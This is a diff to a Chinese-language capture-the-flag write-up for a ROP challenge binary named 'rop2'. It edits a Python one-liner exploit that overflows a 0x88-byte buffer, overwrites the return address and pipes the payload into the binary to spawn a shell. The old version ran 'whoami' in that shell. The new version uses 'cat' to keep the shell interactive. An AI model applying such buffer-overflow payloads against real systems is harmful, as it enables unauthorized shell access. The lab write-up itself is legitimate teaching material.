@@ -72,10 +72,10 @@ int main(int argc, char** argv) {
 地址是 `0x08048610`。因此构造一下输入：
 
 ```python
-python -c "print '0' * 0x88 + '0000\xb1\x84\x04\x08\x10\x86\x04\x08' + '0' * (256 - 0x88 - 12) + 'whoami\x0a'" | ./rop2-20f65dd0bcbe267d
-                              ↑EBP ↑----返回地址----↑----栈顶内容----↑   ↑缓冲区剩余部分
+(python -c "print '0' * 0x88 + '0000\xb1\x84\x04\x08\x10\x86\x04\x08\n'";cat) | ./rop2-20f65dd0bcbe267d
+                               ↑EBP ↑----返回地址----↑----栈顶内容----↑   ↑缓冲区剩余部分
 ```
 
-就可以了。这段输入将在打开的 bash 中执行 `whoami`，打印出当前用户。由于不明原因，我的 Ubuntu 18.04 无法使用 cat 继续读入标准输入，所以只好把命令加在输入的 256 个字符之后了。
+就可以了。
 
 {% include writeup_end.html %}
